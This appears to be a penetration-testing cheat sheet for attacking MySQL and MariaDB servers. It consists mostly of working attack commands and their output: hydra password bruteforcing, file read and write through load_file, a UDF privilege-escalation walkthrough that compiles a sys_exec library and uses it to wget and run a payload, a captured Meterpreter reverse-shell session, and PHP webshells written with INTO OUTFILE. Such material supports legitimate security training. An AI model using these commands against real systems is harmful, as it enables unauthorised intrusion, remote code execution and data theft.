# 3306 - MySQL

| RESOURCES                                                                                                                                                |
| -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE\_SQL\_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) |
| [https://www.w3schools.com/php/php\_mysql\_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)                                                 |

## Syntax

{% code overflow="wrap" fullWidth="true" %}
```bash
# Nmap
nmap --script=mysql-enum <target>
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>

mysql -u root -p

# REMOTE
mysql -h <Hostname> -u root -p
mysql -h <Hostname> -u root@localhost

# DUMP INFO
mysqldump -u $USER -p $DB_NAME $DB_TABLE

# Metasploit
msf> use auxiliary/scanner/mysql/mysql_version
msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump

# Syntax
mysql> show databases;
       show tables;
       select * from users;
mysql> create database $name;
       create table $name;
       create table $name($field $type($nºbytes)); # example Alumnos(id int(2));
       describe $name;
       insert into $table(id, username) values(1, "admin");
       
# COMMENTS
-- -
#

# ENUMERATION
# Show privileges of our user
SHOW Grants;
# Check variables such as hostname, arch and plugin_dir (in case it's not the default path for MySQL installation)
show variables;

# TO CREATE A MYSQL REMOTE CONNECTION
# 1 - Create username with the IP of the victim machine, IDENTIFIED BY '$PASSWORD'
MariaDB [(none)]> create user 'antz'@'10.10.10.10' IDENTIFIED BY 'DontExploitMePls'
# Create a databse
MariaDB [(none)]> Create Database DeleteMeWhenDone;
MariaDB [(none)]> GRANT ALL on DeleteMeWhenDone.* TO 'antz'@'10.10.10.100';
MariaDB [(none)]> FLUSH PRIVILEGES;

MariaDB [DeleteMeWhenDone]> create table test ( OUTPUT TEXT(4096) ) ;
```
{% endcode %}

## **Bruteforce**

```bash
hydra -L users -F -P /usr/share/custom-wordlists/Passwords/rockyou-40.txt $IP mysql
```

## **Privesc**

### **Windows**

{% code overflow="wrap" fullWidth="true" %}
```sql
# Show privileges
show grants;
# Read files
select load_file('C:/users/administrator/desktop/test.txt');
# Write a file
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
# Upload a file to the target using SMB server (UNC path)
select load_file('\\\\192.168.10.10\\share\\evil.dll') into dumpfile "C:/Windows/System32/evil.dll";
```
{% endcode %}

### **UDF library exploit**

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.exploit-db.com/exploits/1518 # relevant Exploit Database entry
https://github.com/AgatinoCaruso/lib_mysqludf_sys_mariadb # fork of Github repo mentioned on the previous link
linux_x86/local/46249.py

# If we access MySQL database with root creds, we check privileges
MariaDB [(none)]> show variables;
...                                                                                                                                            
| plugin_dir                                             | /home/dev/plugin/          
...
| hostname                                               | whatever                       
...
| version                                                | 10.3.7-MariaDB  
# If plugin_dir is not on the standard place, we can upload "plugins" there and exploit. We search for MySQL exploits and find:
MySQL User-Defined (Linux) (x86) - 'sys_exec' Local Privilege Escalation                                                                   | linux_x86/local/46249.py
# there is a bunch of shellcode that we do not know, but we can resume steps to this:
select @@plugin_dir
select binary 0xshellcode into dumpfile '@@plugin_dir+udf_filename';
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec';
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
# We found a Github repo talking about this and we clone it
https://github.com/AgatinoCaruso/lib_mysqludf_sys_mariadb
# We see a UDF library that allows us to execute commands:
└─$ cat lib_mysqludf_sys.c
...
my_ulonglong sys_exec(
        UDF_INIT *initid
,       UDF_ARGS *args
,       char *is_null
,       char *error
){
        return system(args->args[0]);
}
...
# Looking at install.sh we need prerequisites for Kali
sudo apt install default-libmysqlclient-dev mariadb-server libmariadbd-dev
# Now that we have the dependencies installed, we need to remove the oldobject file before generating the new one.
└─$ rm lib_mysqludf_sys.so
└─$ sudo make
gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
# The -Wall flag enables all of gcc's warning messages and -I includes the directory of header files. The list included in the command found in Listing 60 are common locations for header files for MariaDB. The -shared flag tells gcc this is a shared library and to generate a shared object file. Finally, -o tells gcc where to output the file.

# Recalling the SQL commands from the UDF exploit, to transfer the shared library to the target database server, we will need the file as a hexdump.
└─$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex

# The contents of the lib_mysqludf_sys.so.hex file is what we will use for shellcode.
MariaDB [(none)]> set @shell = 0x7f454c460...00000000000000000000;
Query OK, 0 rows affected (0.149 sec)
# We check again the value of plugin_dir variable:
MariaDB [(none)]> select @@plugin_dir;
+-------------------+
| @@plugin_dir      |
+-------------------+
| /home/dev/plugin/ |
+-------------------+
# Let's attempt to dump the binary shell to a file.
MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
Query OK, 1 row affected (0.057 sec)
# create a function
MariaDB [(none)]> create function sys_exec returns int soname 'udf_sys_exec.so';
Query OK, 0 rows affected (0.051 sec)
# running a command that queries for the sys_exec function
MariaDB [(none)]> select * from mysql.func where name='sys_exec';
+----------+-----+-----------------+----------+
| name     | ret | dl              | type     |
+----------+-----+-----------------+----------+
| sys_exec |   2 | udf_sys_exec.so | function |
+----------+-----+-----------------+----------+
# Now we execute again that Meterpreter shell
MariaDB [(none)]> select sys_exec('wget http://192.168.239.169/shell.elf');

+---------------------------------------------------+
| sys_exec('wget http://192.168.239.169/shell.elf') |
+---------------------------------------------------+
|                                                 0 |
+---------------------------------------------------+
1 row in set (0.183 sec)

MariaDB [(none)]> 
MariaDB [(none)]> select sys_exec('chmod +x shell.elf');
+--------------------------------+
| sys_exec('chmod +x shell.elf') |
+--------------------------------+
|                              0 |
+--------------------------------+
MariaDB [(none)]> select sys_exec('./shell.elf');


# We get a connection back on MSF:
[*] Started reverse TCP handler on 192.168.239.169:443 
[*] Sending stage (1017704 bytes) to 10.11.1.250
[*] Meterpreter session 1 opened (192.168.239.169:443 -> 10.11.1.250:20941) at 2022-11-10 09:27:23 -0500

meterpreter > shell
Process 5564 created.
Channel 1 created.
whoami
mysql
```
{% endcode %}

[**https://www.exploit-db.com/exploits/1518**](https://www.exploit-db.com/exploits/1518)

Most likely, we **need root** privileges/credentials on MySQL to be able to exploit it and also **mysql is running as root.**

[https://redteamnation.com/mysql-user-defined-functions/](https://redteamnation.com/mysql-user-defined-functions/) → MySQL < 5.X

[https://www.exploit-db.com/exploits/50236](https://www.exploit-db.com/exploits/50236) → works for MySQL 4.X/5.X, it has some errors, good one is udf.py on my Kali

[https://www.exploit-db.com/papers/44139](https://www.exploit-db.com/papers/44139)

[https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)

### Write files (webshell)

We can get RCE if we use MySQL to upload a file with a webshell:

{% code overflow="wrap" fullWidth="true" %}
```sql
select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4 into OUTFILE 'C:/xampp/htdocs/shell.php'

select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php

# SOMETIMES IT IS NECESSARY TO USE HEX NOTATION 
echo -n "<?php phpinfo(); ?>" | xxd -ps
mysql> select 0x.... into outfile "...";
```
{% endcode %}
